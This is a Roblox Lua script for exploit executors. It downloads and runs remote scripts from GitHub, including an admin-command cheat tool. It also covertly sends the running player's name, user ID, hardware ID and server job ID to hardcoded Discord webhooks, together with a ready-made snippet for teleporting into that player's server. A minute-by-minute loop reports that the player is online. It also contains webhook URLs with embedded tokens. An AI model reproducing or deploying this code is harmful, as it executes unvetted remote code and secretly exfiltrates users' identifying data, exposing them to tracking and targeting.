local placeId = game.PlaceId

-- Check if the Place ID matches any of the specified values
if placeId == 14044547200 or placeId == 8365905206 then
    -- Execute the external script if the Place ID is correct
    loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/untitled%20tag%20key.txt"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end

if placeId == 15135285305 then
    -- Execute the external script if the Place ID is correct
    loadstring(game:HttpGet('https://raw.githubusercontent.com/gitolan/gefbymeop-/main/gefkey'))()
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/gitolan/gefop-/main/gg'))()

local function sendTeleportInfoAndPrepareScript()
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    local TeleportService = game:GetService("TeleportService")

    -- Replace this with your webhook URL
    local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"

    -- Function to send information to Discord and prepare teleport script
    local function sendTeleportInfo()
        local localPlayer = Players.LocalPlayer
        if not localPlayer then
            warn("LocalPlayer not found")
            return
        end

        local playerName = localPlayer.Name
        local userId = localPlayer.UserId
        local HWID = RbxAnalyticsService:GetClientId()
        local placeId = game.PlaceId
        local jobId = game.JobId

        local requestMethod = "Unknown"
        local response = nil

        -- Determine which HTTP request method is available and use it
        if syn and syn.request then
            requestMethod = "syn"
            response = syn.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif http and http.request then
            requestMethod = "http"
            response = http.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif request then
            requestMethod = "request"
            response = request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif http_request then
            requestMethod = "http_request"
            response = http_request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif solara and solara.request then
            requestMethod = "solara"
            response = solara.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif curl then
            requestMethod = "curl"
            local jsonData = HttpService:JSONEncode({["content"] = "Test message"})
            local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
            local handle = io.popen(cmd)
            local result = handle:read("*a")
            handle:close()
            response = {StatusCode = 200, StatusMessage = result}
        elseif fetch then
            requestMethod = "fetch"
            response = fetch(webhookUrl, {
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        else
            warn("No suitable HTTP request method found")
            return
        end

        -- Check response status
        if response and (response.StatusCode == 200 or response.StatusCode == 204) then
            print("Successfully: " .. requestMethod)
        else
            warn("failed: " .. (response and response.StatusMessage or "unknown error"))
        end

        -- Create payload to send to Discord
        local data = {
            ["content"] = "------------\nName of LocalPlayer: " .. playerName .. "\nUserId of LocalPlayer: " .. userId .. "\nHWID of LocalPlayer: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\nHTTP Request Method: " .. requestMethod .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
        }

        -- Convert data to JSON format
        local jsonData = HttpService:JSONEncode(data)

        -- Send POST request to Discord webhook with the actual data
        if syn and syn.request then
            response = syn.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif http and http.request then
            response = http.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif request then
            response = request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif http_request then
            response = http_request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif solara and solara.request then
            response = solara.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif curl then
            local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
            local handle = io.popen(cmd)
            local result = handle:read("*a")
            handle:close()
            response = {StatusCode = 200, StatusMessage = result}
        elseif fetch then
            response = fetch(webhookUrl, {
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        else
            warn("Please use Arceus X Neo or solara or fluxus.")
            return
        end

        if response and (response.StatusCode == 200 or response.StatusCode == 204) then
            print("Successfully")
        else
            warn("Failed: " .. (response and response.StatusMessage or "unknown error"))
        end
    end

    -- Wait for local player to be available before sending information and teleporting
    Players.PlayerAdded:Connect(function(player)
        if player == Players.LocalPlayer then
            sendTeleportInfo()
            -- Uncomment below line if you want to teleport after sending info
            -- teleportToServer(game.PlaceId, game.JobId)
        end
    end)

    -- If local player is already present (e.g., if script is run after player is added)
    if Players.LocalPlayer then
        sendTeleportInfo()
        -- Uncomment below line if you want to teleport after sending info
        -- teleportToServer(game.PlaceId, game.JobId)
    end
end

-- Invoke the function to send teleport information and prepare teleport script
sendTeleportInfoAndPrepareScript()

local function sendLocalPlayerInfoToDiscord()
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local RunService = game:GetService("RunService")

    -- Replace this with your new webhook URL
    local webhookUrl = "https://discord.com/api/webhooks/1251060149418721330/C8rob6bHsdk24wALnkCXDw7kc5eYzpWzg-pFcmU-3uRSFRA9NxZdQhf3bsw1XNXdirWM"
    local messageId = "1251380509687414795" -- Replace with your actual message ID

    local localPlayer = Players.LocalPlayer

    -- Function to send local player info to Discord
    local function sendLocalPlayerInfo()
        local playerInfo = "Script User Online: " .. localPlayer.Name

        local data = {
            ["content"] = playerInfo
        }

        -- Convert data to JSON format
        local jsonData = HttpService:JSONEncode(data)

        -- Function to handle HTTP request
        local function makeHttpRequest()
            local response
            if syn then
                response = syn.request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            elseif http and http.request then
                response = http.request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            elseif request then
                response = request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            elseif http_request then
                response = http_request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            elseif solara then
                response = solara.request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            else
                warn("Please use Arceus X Neo or solara or fluxus.")
                return
            end

            if response.StatusCode == 200 then
                print("successfully.")
            else
                warn("Error: " .. response.StatusMessage)
            end
        end

        makeHttpRequest()
    end

    -- Send initial local player info
    sendLocalPlayerInfo()

    -- Periodic updates (every 60 seconds)
    while true do
        wait(60)
        sendLocalPlayerInfo()
    end
end

-- Invoke the function to send local player information to Discord
sendLocalPlayerInfoToDiscord()
